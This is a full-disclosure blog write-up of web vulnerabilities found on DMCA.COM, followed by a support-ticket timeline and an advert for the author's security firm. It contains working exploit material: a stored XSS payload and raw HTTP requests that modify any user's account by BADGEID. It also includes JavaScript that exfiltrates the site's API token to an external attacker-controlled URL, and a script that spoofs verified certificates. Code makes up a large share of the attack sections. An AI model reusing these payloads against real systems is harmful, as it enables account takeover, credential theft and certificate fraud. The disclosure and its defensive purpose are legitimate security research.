---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-04-21_dmcacom-hack-full-disclosure-with-proof-of-concept.md
original_filename: 2021-04-21_dmcacom-hack-full-disclosure-with-proof-of-concept.md
title: DMCA.COM Hack, Full Disclosure (With Proof-of-Concept)
category: documents
detected_topics:
- access-control
- xss
- command-injection
- otp
- automation-abuse
- cors
tags:
- imported
- documents
- access-control
- xss
- command-injection
- otp
- automation-abuse
- cors
language: en
raw_sha256: 69151f291cd125345c353a8ac095f92b93067424c8fba99520f1bafa0c7358ba
text_sha256: d06dc1dbd213e0c4ab5c7026f6d9f5f8988d54b639d7a080c09173e5de3bea1a
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# DMCA.COM Hack, Full Disclosure (With Proof-of-Concept)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-04-21_dmcacom-hack-full-disclosure-with-proof-of-concept.md
- Source Type: markdown
- Detected Topics: access-control, xss, command-injection, otp, automation-abuse, cors
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `69151f291cd125345c353a8ac095f92b93067424c8fba99520f1bafa0c7358ba`
- Text SHA256: `d06dc1dbd213e0c4ab5c7026f6d9f5f8988d54b639d7a080c09173e5de3bea1a`


## Content

---
title: "DMCA.COM Hack, Full Disclosure (With Proof-of-Concept)"
url: "https://websec.nl/blog/606ecfec2f798a048269340e/dmcacom%20hack%20full%20disclosure%20with%20proof-of-concept"
authors: ["Joël Aviad Ossi"]
programs: ["DMCA"]
bugs: ["Privilege escalation", "Client-side enforcement of server-side security", "Stored XSS", "Broken Access Control"]
publication_date: "2021-04-21"
added_date: "2022-10-24"
source: "pentester.land/writeups.json"
original_index: 3720
scraped_via: "browseros"
---

# DMCA.COM Hack, Full Disclosure (With Proof-of-Concept)

What is DMCA.COM

First of all, for those who don’t know what DMCA is: DMCA stands for the ‘Digital Millennium Copyright Act’, which is a law protecting people’s intellectual property such as images, texts and other content. DMCA.COM provides services pertaining to that law by offering solutions such as takedown requests (removing the copied material from the internet).

With over 1.13 million customers, DMCA.COM is one of the (if not the) leading companies offering copyright protection solutions to individuals and corporations worldwide. 

Pre-Exploitation (Recon)

I registered at DMCA at first with an intention to protect my own website, however, while navigating through their web application I came across something interesting. On the page where one can setup the business profile it said, that some of the features are disabled and only available for the Pro users.

I opened Inspect Element in my Chrome browser and saw that these features were just client-side disabled in the HTML code, which is quite easy to bypass by stripping out the specific part of the HTML code, which I did. This vulnerability is called ‘Client-Side Enforcement of Server-Side Security’

You can see in the image below that to include your logo or social network information, a Protection Pro status is required but despite this I still managed to place content into the value of those input fields and apply the changes.

The fact that this application was vulnerable to something like this made me think that I can find much more. So I opened Burp Suite (pentesting software) and replayed the request which has been sent to the server.

In the above request I modified the parameters:

TWITTER_URL
LOGO_URL
LINKEDIN_URL
FB_URL
DMCA_FAX
ENABLE_CASE_SUBMISSION

These parameters refer to the Pro features, however, you can still input your data in their values, and this will apply the changes even if you do not have an upgraded account. This confirms the vulnerability ‘Violation of Secure Design Principles’.

At this point I got interested and wondered if this might also parse inline JavaScript into a href tag (in order to get XSS). After fuzzing this request a bit I noticed that it does not like double quotes but everything else is fine.
I also noticed that some of these values will be placed inside of a href tag so I decided to use a simple inline XSS payload that does not require any quotes

XSS Payload used: javascript:window.open(‘somesitename’);

As we can see on the picture above, it returned a status in the response with the text ‘4 Updated’ which means that the changes were saved successfully.

Next I went to my profile page and, just like I thought, the XSS code was not sanitized before being inserted into the href attribute (See picture below).

At this point Stored XSS was confirmed, it seemed like a dead end as the session cookie was protected with HttpOnly which is the main security to prevent cookie stealing, so I had to figure out another way of obtaining sensitive data such as fetching sensitive information present within the HTML DOM.

PoC: https://screencast-o-matic.com/watch/cYQYo5JPKt

As I couldn’t get the session cookie, I checked the DOM for sensitive information and found that $(‘script’)[23].innerText contained the Logged-in user E-Mail and some other information, so I made it steal the name of the logged-in user, the e-mail and UUID.

Note: Using Arrays like in the code above is not always the best approach, if you ever get into the same situation than try to refrain from this practice and get something that directly identifies the script tag (Usually using querySelector does the trick), Using arrays is not a great idea as the array number often changes in a page which has lots of script tags.

Next, I made the script (cookie stealer) which sends the information Base64 encoded to prevent it from blocking the request (since the data contains a double quote), see picture below:

As soon as someone clicks my social tabs it would now log these information to my modified cookie stealer.

To decode the received Base64 string I just used an online decoder, you can see the result below:

 

A couple of days later I discovered multiple other vulnerabilities in DMCA.COM and at that time I could do much more than just getting simple information.

One of the new things I discovered was the ability to inject JavaScript code into any user’s dashboard, without user interaction or permission. 
This vulnerability is called Improper Access Control

This vulnerability exists in the api.dmca.com/addProtectedItem POST request.
In the POST request I changed the ‘BADGEID’ to the target’s ‘BADGEID’ and then I changed the parameter status from ‘Active’ to my XSS code.

Injecting JavaScript into users account is one thing but actually taking over their account is much more challenging, specially when the session cookie is protected with HttpOnly.

However inside of the DOM I noticed something called “window.APIToken” which turns out to be the DMCA API authentication token which is required to query the API and this was readable through JavaScript. The interesting thing is that this doesn’t just affect the dashboard but also the support ticket and many more other areas where no real reason exists for this token to even be present.

PoC: https://screencast-o-matic.com/u/Yrny/dmca2

The above video shows XSS through the DMCA_FAX or DMCA_ADDRESS parameter, which basically affects the compliance page. I injected a custom remote javascript file to be loaded into the page which logs the window.APIToken to my modified cookie stealer.

To query the DMCA API you can simply use the swagger documentation: https://app.swaggerhub.com/apis-docs/dmca/dmca-api/2.1.1#/

Now if that was not vulnerable enough, here is more: combine this with the Improper Access Control and you can steal the window.APIToken from anyone!

Even their support tickets are vulnerable for the window.APIToken stealing which means that one could takeover API access on the permission of a Support Employee.

PoC: to takeover accounts just replace the BADGEID with the target’s BADGEID and put in STATUS an XSS cookie stealing code which forwards to your cookie stealer the window.APIToken instead of document.cookie , similar to the image below.

Note: in the response you can see all of the used parameters, these parameters can also be changed by adding / appending them to the parameters in the POST request, example ‘ownerName’ can be changed.

Also an interesting thing to note is that if you replace your “BADGEID” in the request with the BADGEID of a DMCA Pro user you will be able to add domains on the target’s behave and therefore get a non-spoofed VALID DMCA certificate issued for any domain of your choosing, without domain verification!

Next, I managed to find a couple of pro DMCA users by just looking at the sitemap.xml file of dmca.com , an alternative way of finding pro BADGEID’s is just by googeling for DMCA Badge google dork.

After more recon I figured out that it was also possible to add JavaScript into the badge certification page, which is a major part of the DMCA.com business model.

This allowed me to create spoofed / fake verified DMCA certificates. 

Since this part is vulnerable I can simply include a remote JavaScript file into the HTML, together with a code which makes it look verified. The included JavaScript code will automatically change all the related document element's from non-verified to verified and therefore spoof a valid certificate.

PoC: code_cert.js code will be included in this writeup, adding this in a similar way like in the code below will result in having a verified certificate without Pro subscription or domain verification.

The above code will result in the following outcome:

Issue Verified (Real) Certificates without Domain Validation

After some time I also noticed that it was possible to use someone elses badgeID to modify their account, so if the user has a Pro subscription you can add websites to their account and bypass the domain verification security.

In this example we issued a DMCA.COM (Verified Certificate) for The FBI.

https://www.dmca.com/Protection/Status.aspx?ID=0bdbf7fe-bc10-4dc4-af7c-10153f502bac&PAGE_ID=&lang=en-US&st=true&refurl=https://fbi.gov/

The BadgeID of the above example is from a random pro user (No damage has been done to his account) , only thing is that he controls now the certificate for FBI.GOV without ever needing to do a domain verification.

Issue Name: Improper Access Control

Useful Request Information

Get anyone’s BADGEID by domain name / FQDN:
POST /site-report/Default.aspx/GetSites HTTP/1.1
Host: www.dmca.com
Connection: close
Content-Length: 23
X-MOD-SBB-CTYPE: xhr
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Content-Type: application/json
Origin: https://www.dmca.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.dmca.com/site-report/edit.aspx?msg=valcompleted&site=www.websec.nl
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: YOURCOOKIESHERE

{“FQDN”:”www.targetsite.com"}

Improper Access Control (Change anyone’s account data):

POST /addProtectedItem HTTP/1.1
Host: api.dmca.com
Connection: close
Content-Length: 155
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
token: YOURAPITOKEN
Content-Type: application/json; charset=UTF-8
Origin: https://www.dmca.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.dmca.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{
   "URL": "https://TARGETSITE.COM",
   "TITLE": "https://TARGETSITE.COM",
   "STATUS": "Active",
   "DESCRIPTION": "",
   "TYPE": "Web page",
   "BADGEID": "TARGETBADGEID"
}

Do not forget to put your API token at YOURAPITOKEN.

Exploit Code Information

API Token Stealing Code (This must be placed on your external JavaScript File and remotely included using SCRIPT SRC as XSS Payload):

setTimeout(function () {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            document.getElementById("ctl00_lnkUpgradePro").innerHTML = this.responseText;
        }
    };

    xhttp.open("GET", "https://Y/arma.php?c=DMCA_API_TOKEN:<br><br>"+btoa(window.APIToken), true);
    xhttp.send();
    console.log('[+] Exploit Success');
}, 3000);

Certificate Spoofing Code (This basically must be placed inside of the JS file and remotely included using SCRIPT SRC as XSS Payload):

document.getElementById("ctl00_cntBody_lnkPageUrl").removeAttribute("rel");
document.getElementById("ctl00_cntBody_lnkPageUrl").innerText = "Change me or Remove me";
document.getElementById("ctl00_cntBody_lnkAccountStatus").innerText = "Verified";
document.getElementById("ctl00_cntBody_lnkAccountStatus").removeAttribute("style");
document.getElementById("ctl00_cntBody_divBadgeShield").className = "verified col-sm-3 col-sm-pull-9";
$(".protection-info").attr("id", "verifiedmenu");
document.getElementById("verifiedmenu").className = "protection-info ver";
document.getElementById("ctl00_cntBody_divBadgeCont").className = "badge-verified";
document.getElementById("ctl00_cntBody_lnkAccountStatus").innerText = "Verified";
document.querySelector(".help.certificate-tooltip.fa.fa-question-circle").children[0].innerHTML = atob(
    "CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPSJjYWxsb3V0IiBzcmM9Imh0dHBzOi8vZG1jYS13ZWItNGtxMmcwdGNhcXBqMDJlaWgwbzYuc3RhY2twYXRoZG5zLmNvbS9hcHBfdGhlbWVzL2RtY2EvaW1hZ2VzL2NhbGxvdXRfYmxhY2suZ2lmIiBhbHQ9IiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaGUgYmFkZ2UgaG9sZGVyJ3MgYWNjb3VudCBoYXMgYSBnb29kIHN0YW5kaW5nIG1lbWJlcnNoaXAgb2YgRE1DQS5jb20ncyBQcm90ZWN0aW9uIFBybyBzZXJ2aWNlIGFuZCBpdHMgaW5mb3JtYXRpb24gaGFzIGJlZW4gdmVyaWZpZWQuIEZvciBtb3JlIGluZm8gdmlzaXQgdGhlIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvRkFRL1doYXQtZG9lcy10aGUtQWNjb3VudC1TdGF0dXMtVmVyaWZpZWQtb24tdGhlLURNQ0Fjb20tUHJvdGVjdGlvbi1DZXJ0aWZpY2F0ZS1tZWFuP3I9YXN2dHQiPkZBUTwvYT4uCiAgICAgICAgICAgICAgICAgICAgICAgIA=="
);

var str = document.getElementById("ctl00_cntBody_lnkAccountStatus").outerHTML;
var res = str.replace("nonverCert", "verifCert");
document.getElementById("ctl00_cntBody_lnkAccountStatus").outerHTML = res;
setTimeout(function () {
    document.getElementById("ctl00_cntBody_lnkPageUrl").removeAttribute("rel");
    document.getElementById("ctl00_cntBody_lnkPageUrl").innerText = "pentest";
    document.getElementById("ctl00_cntBody_divBadgeShield").className = "verified col-sm-3 col-sm-pull-9";
    $(".protection-info").attr("id", "verifiedmenu");
    document.getElementById("verifiedmenu").className = "protection-info ver";
    document.getElementById("spProtectionStatus").innerHTML = "<span id='ctl00_cntBody_lblProtectionStatus' title='This page is protected by DMCA.com's webpage protection guarantee' style='font-weight:bold;'>Active</span>";
    document.getElementById("spProtectionStatusHelp").innerHTML = atob(
        "CiAgICAgICAgICAgICAgICAgICAgPHNwYW4gc3R5bGU9Im1hcmdpbi1sZWZ0OiAyNXB4OyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgY2xhc3M9ImNhbGxvdXQiIHNyYz0iaHR0cHM6Ly9kbWNhLXdlYi00a3EyZzB0Y2FxcGowMmVpaDBvNi5zdGFja3BhdGhkbnMuY29tL2FwcF90aGVtZXMvZG1jYS9pbWFnZXMvY2FsbG91dF9ibGFjay5naWYiIGFsdD0iIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9ImN0bDAwX2NudEJvZHlfc3BuU3RhdHVzQWN0aXZlIj5ETUNBLmNvbSBoYXMgc2Nhbm5lZCBhbmQgYXBwcm92ZWQgdGhpcyBzcGVjaWZpYyBwYWdlIGZvciBwcm90ZWN0aW9uLjwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICA8L3NwYW4+CiAgICAgICAgICAgICAgICA="
    );
    document.getElementById("ctl00_cntBody_divBadgeCont").className = "badge-verified";
    document.getElementById("ctl00_cntBody_lnkAccountStatus").innerText = "Verified";
    document.getElementById("timelineTooltip").remove();
    document.getElementById("spDuration").innerHTML = atob(
        "ICAgICAgICAgICAgICAgICAgICBQcm90ZWN0aW9uIER1cmF0aW9uOgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGlkPSJsYmxEdXJhdGlvbiI+MzY1PC9zcGFuPiBkYXlzCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iY2VydGlmaWNhdGUtdG9vbHRpcCBidXR0b24tcmVjaGVjayBmYSBmYS1zeW5jLWFsdCIgc3R5bGU9ImRpc3BsYXk6IGlubGluZTsiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBpZD0iY3RsMDBfY250Qm9keV9idG5Qcm90ZWN0aW9uUmVjaGVjayIgdGl0bGU9IlJlLUNoZWNrIiBocmVmPSJqYXZhc2NyaXB0Ol9fZG9Qb3N0QmFjaygnY3RsMDAkY250Qm9keSRidG5Qcm90ZWN0aW9uUmVjaGVjaycsJycpIj48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIHN0eWxlPSJtYXJnaW46MjZweCAwIDAgLTEzMnB4OyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPSJjYWxsb3V0IiBzcmM9Imh0dHBzOi8vZG1jYS13ZWItNGtxMmcwdGNhcXBqMDJlaWgwbzYuc3RhY2twYXRoZG5zLmNvbS9hcHBfdGhlbWVzL2RtY2EvaW1hZ2VzL2NhbGxvdXRfYmxhY2suZ2lmIiBhbHQ9IiI+IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2xpY2sgaGVyZSB0byByZXNjYW4gdGhpcyBjZXJ0aWZpY2F0ZS4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZvciBtb3JlIGluZm8gdmlzaXQgdGhlIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvc29sdXRpb25zL3ZpZXcuYXNweD9JRD05MDM4MmJhNS1kMmEyLTQ2NDYtYmIxNy0xODM2NWVhMDAzYzcmYW1wO3I9cmVjdHQiIG9uY2xpY2s9ImV2ZW50LnN0b3BQcm9wYWdhdGlvbigpIj5GQVE8L2E+LgogICAgICAgICAgICAgICAgICAgICAgICA8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPC9zcGFuPgogICAgICAgICAgICAgICAg"
    );
    document.getElementById("ctl00_cntBody_lnkAccountStatus").removeAttribute("style");
    document.getElementById("spDuration").removeAttribute("style");
    var str = document.getElementById("ctl00_cntBody_lnkAccountStatus").outerHTML;
    var res = str.replace("nonverCert", "verifCert");
    document.getElementById("ctl00_cntBody_lnkAccountStatus").outerHTML = res;
    document.getElementsByClassName("help certificate-tooltip fa fa-question-circle")[2].innerText = atob(
        "CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaGUgYmFkZ2UgaG9sZGVyJ3MgYWNjb3VudCBoYXMgYSBnb29kIHN0YW5kaW5nIG1lbWJlcnNoaXAgb2YgRE1DQS5jb20ncyBQcm90ZWN0aW9uIFBybyBzZXJ2aWNlIGFuZCBpdHMgaW5mb3JtYXRpb24gaGFzIGJlZW4gdmVyaWZpZWQuIEZvciBtb3JlIGluZm8gdmlzaXQgdGhlIEZBUS4KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAg"
    );
    document.getElementsByClassName("protectionTimeline")[0].innerHTML =
        "<svg width='300' height='40'><defs><pattern id='diagonalHatchPending' patternUnits='userSpaceOnUse' width='4' height='4'><path d='M-1,1 l2,-2 M0,4 l4,-4 M3,5 l2,-2'></path></pattern></defs><defs><pattern id='diagonalHatchProtected' patternUnits='userSpaceOnUse' width='4' height='4'><path d='M-1,1 l2,-2 M0,4 l4,-4 M3,5 l2,-2'></path></pattern></defs><rect x='1' y='10' width='207.6' height='20' fill='url(#diagonalHatchPending)'></rect><rect x='208.6' y='10' width='90.4' height='20' fill='url(#diagonalHatchProtected)'></rect><rect class='rect' x='1' y='10' width='298' height='20' style='fill: rgb(126, 202, 38);'></rect><g><line class='tick grey-dashed' x1='1' x2='1' y1='7' y2='33'></line></g><g><line class='tick' x1='1' x2='1' y1='8' y2='32'></line></g><g><line class='tick' x1='3.328125' x2='3.328125' y1='8' y2='32'></line></g><g><line class='tick' x1='299' x2='299' y1='8' y2='32'></line></g><text class='timelinetext' x='10' y='24' style='font-weight: bold;'>Page is Protected</text></svg>";
    console.log("[+] Exploit Success");
}, 3100);
DMCA Contact Timeline

DMCA-CASE#243307
Support Case Closed 04/14/2021 5:56:49 PM steve@dmca.com DMCA-CASE#244261
Support Case Closed 10/07/2020 9:09:28 AM Joel Ossi DMCA-CASE#243162
Support Case Closed 09/29/2020 6:00:34 PM matthew@dmca.com DMCA-CASE#242011
Support Case Closed 09/26/2020 1:55:02 PM dmca_bot@dmca.com DMCA-CASE#242130
Support Case Closed 09/22/2020 6:43:47 PM steve@dmca.com

DMCA Most Recent Contact

Comment Date Created By Hi,

Our development team will be reaching out if / when they need to. Our support department cannot help you on this.

- 04/14/2021 5:56:49 PM steve@dmca.com

I have given DMCA a reasonable amount of time to reply to my tickets, 7 months. I will give DMCA one more opportunity to take a good look at my tickets, otherwise I will proceed with the publication of my findings. Best Regards, Joel

- 04/08/2021 10:19:32 AM Joel Ossi Hi Joel

As we stated already, our dev team will be reaching out if / when they need to. Our support department cannot help you on this. Have a nice day DMCA Support

- 09/30/2020 5:01:12 PM matthew@dmca.com

For your information / Disclaimer

All findings were reported responsibly, however a timeframe of over 7 months extra was given to DMCA to either respond to my tickets or mitigate these flaws, multiple attempts have been done to communicate with DMCA through LinkedIn, tickets and e-mail but without any detailed reply. therefore the researcher has done everything in his power to bring this to DMCA.com’s attention prior to publication.

All things considered, the reasonable thing to do now is to fully disclose the findings through a publication as this is in the best interest of the public.

For anyone reading this who wants to secure their website or IT Infrastructure

While most of the vulnerabilities in this article could have been solved by implementing a sanitization function such as htmlspecialchars and proper Access Control, its understandable that this can be a hassle for the non-technical ones who own a website,

However, did you know that you can outsource your entire security to a specialized IT Security company? And did you know that this does not have to be expensive at all?

WebSec is a professional security firm offering a range of security services for companies of all sizes for the purpose of making you more cybersecurity resilient against the most modern cyber threats while remaining extremely cost-effective, flexible and high in quality, still not convinced? We offer a free trial pentest for your organization.

Interested in the terms? Click here: pentest and contact us today!
